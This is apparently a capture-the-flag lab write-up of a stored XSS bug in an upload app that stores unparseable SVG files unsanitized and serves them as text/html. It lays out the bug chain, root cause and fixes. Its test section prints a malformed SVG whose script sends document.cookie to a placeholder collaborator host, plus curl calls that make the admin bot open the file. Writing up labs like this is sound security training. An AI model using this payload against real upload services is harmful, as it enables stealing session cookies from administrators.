# DryClean Unreadable SVG Upload XSS

## What Is Happening

DryClean is a file-upload lab where users drop garments onto a rack and can send any hung item to an admin bot for review. The app accepts `image/*` uploads, stores them at `/items/<hash>.<ext>`, and exposes `POST /api/send` to make the admin open a specific upload.

Readable SVG is sanitized. **Unreadable** SVG — XML the server parser cannot process — is stored raw and served back as **`text/html`**, which lets embedded script execute when the admin visits the file URL.

## Why It Happens

The lab hint maps to two code paths:

```text
readable garment  -> stripped / sanitized / re-encoded
unreadable garment -> left alone
```

For SVG:

1. Well-formed XML goes through a sanitizer that removes `<script>`, event handlers, and similar active content.
2. Parser failures skip sanitization and store the original bytes.
3. The broken `.svg` object is served with `Content-Type: text/html` instead of `image/svg+xml`.
4. The admin bot opens `/items/<hash>.svg` directly in a privileged browser session.

A separate dead-end on this lab: PNG polyglot files with valid magic bytes but invalid image bodies are also stored raw, but Chrome serves them as `image/png` and does not execute trailing HTML on direct navigation.

## Exact Test

1. Create an OAST session (or other collaborator) for out-of-band exfiltration.
2. Upload **malformed** SVG — intentionally unclosed so the parser fails:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>
fetch('https://[collaborator]/?c='+encodeURIComponent(document.cookie))
</script>
```

3. Verify the stored object:

```bash
curl -i "https://[host]/items/[hash].svg"
```

Expected signals:

```http
Content-Type: text/html
```

Body still contains the `<script>` payload.

4. Trigger the admin bot:

```bash
curl -sS -X POST "https://[host]/api/send" \
  -H "Content-Type: application/json" \
  -d '{"hash":"[hash]"}'
```

5. Poll the collaborator for a callback containing cookie or flag data.

## Expected Signal

- Upload returns `{"hash":"...","url":"/items/....svg",...}`
- Stored file keeps attacker script despite `.svg` extension
- `Content-Type` is `text/html`, not `image/svg+xml`
- `/api/send` returns `{"ok":true}`
- Collaborator receives `GET /?c=...` from the lab origin

## Result Interpretation

Confirmed bug chain:

```text
malformed SVG upload
-> parser fails ("can't read")
-> file stored without sanitization
-> served as text/html from /items/<hash>.svg
-> admin bot opens file URL
-> script exfiltrates privileged cookie/flag
```

## Root Cause

Upload handling treats parser success and parser failure differently. Failure mode stores raw attacker bytes and serves them with an active HTML content type on the application origin.

## Impact

- Stored XSS against admin/review bots
- Session or flag cookie disclosure
- Same-origin actions as the reviewing user in real deployments

## Fix

- Reject malformed SVG/XML at upload time
- Never serve upload bytes as `text/html` unless explicitly intended
- Sanitize or rasterize SVG regardless of parser outcome
- Serve uploads from an isolated origin without application cookies
- Mark sensitive cookies `HttpOnly`

## Key Lesson

When lab copy mentions items that "can't be read" being "left alone," test **parser-failure uploads** before spending time on PNG polyglots or content-type override tricks. The bypass may be "no sanitizer ran," not "MIME sniffing."

## Related Patterns

- Direct SVG script upload: `writeups/inkbleed-svg-upload-xss-curator-bot.md`
- PNG polyglot + object-storage override: `payloads/xss/png-s3-response-content-type-xss.md`
